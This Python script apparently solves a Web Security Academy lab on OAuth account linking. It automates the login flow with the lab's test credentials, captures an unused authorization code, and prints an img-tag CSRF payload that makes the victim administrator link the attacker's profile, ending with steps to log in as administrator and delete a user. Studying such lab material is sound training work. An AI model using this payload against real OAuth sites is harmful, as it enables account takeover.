import http.client
import re
import ssl
import time
import urllib.parse

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_auth(
        oauth_server_id: str,
        client_id: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/auth'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    query_params = [
        ('client_id', client_id),
        ('redirect_uri', f'https://{LAB_ID}.web-security-academy.net/oauth-login'),
        ('response_type', 'code'),
        ('scope', 'openid profile email'),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def POST_interaction_login(
        interaction: str,
        oauth_server_id: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', f'/interaction/{interaction}/login'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'_interaction={interaction}',
    }
    fields = [
        ('username', 'peter.wiener'),
        ('password', 'hotdog'),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_auth_interaction(
        interaction: str,
        oauth_server_id: str,
        session: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/auth/{interaction}'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    cookie_header = f'_interaction_resume={interaction}'
    if session:
        cookie_header += f"; _session={session}; _session.legacy={session}"
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': cookie_header,
        'referer': f'https://oauth-{oauth_server_id}.oauth-server.net/interaction/{interaction}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    body = ''
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_interaction_confirm(
        oauth_server_id: str,
        interaction: str,
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', f'/interaction/{interaction}/confirm'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'_interaction={interaction}; _session={session}; _session.legacy={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = [
    ]
    body = urllib.parse.urlencode(fields)
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = GET_login()
response_body = response.read().decode('utf-8')

print("GET login response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

oauth_server_id = re.findall(r'oauth-([a-zA-Z0-9]+).oauth-server', response_body)[0]
client_id = re.findall(r'client_id=([a-zA-Z0-9]+)', response_body)[0]

print(f"oauth_server_id: {oauth_server_id}")
print(f"client_id: {client_id}")

response = GET_auth(
    oauth_server_id=oauth_server_id,
    client_id=client_id,
)
response_body = response.read().decode('utf-8')

print("GET auth response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

interaction = re.findall(r'/interaction/([-_a-zA-Z0-9]+)', response_body)[0]
print(f"interaction: {interaction}")

response = POST_interaction_login(
    oauth_server_id=oauth_server_id,
    interaction=interaction,
)
response_body = response.read().decode('utf-8')

print("POST interaction login response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

response = GET_auth_interaction(
    oauth_server_id=oauth_server_id,
    interaction=interaction,
)
response_body = response.read().decode('utf-8')

print("GET auth interaction response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

cookie_header = response.getheader('set-cookie')
session = re.findall(r'_session=([-_a-zA-Z0-9]+);', cookie_header)[0]
print(f"_session: {session}")

response = POST_interaction_confirm(
    oauth_server_id=oauth_server_id,
    interaction=interaction,
    session=session,
)
response_body = response.read().decode('utf-8')

print("POST interaction confirm response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()
time.sleep(1)

response = GET_auth_interaction(
    oauth_server_id=oauth_server_id,
    interaction=interaction,
    session=session,
)
response_body = response.read().decode('utf-8')

print("GET auth interaction response:")
print(f"status: {response.status}")
for name, header in response.headers.items():
    print(f'{name}: {header}')
print(response_body)
print()

authorization_code = re.findall(r'code=([-_a-zA-Z0-9]+)', response_body)[0]
print(f'authorization_code: {authorization_code}')

print("Exploit")
print("======================================")
print("File:")
print("/exploit")
print()
print("Head:")
print("""HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""")
print()
print("Body:")
print(f"""<img src="https://{LAB_ID}.web-security-academy.net/oauth-linking?code={authorization_code}"/>""")
print("======================================")
print("""
deliver exploit to victim
accounts linked
log in with social media profile as peter.wiener:hotdog
logged in as administrator
delete user carlos
""")
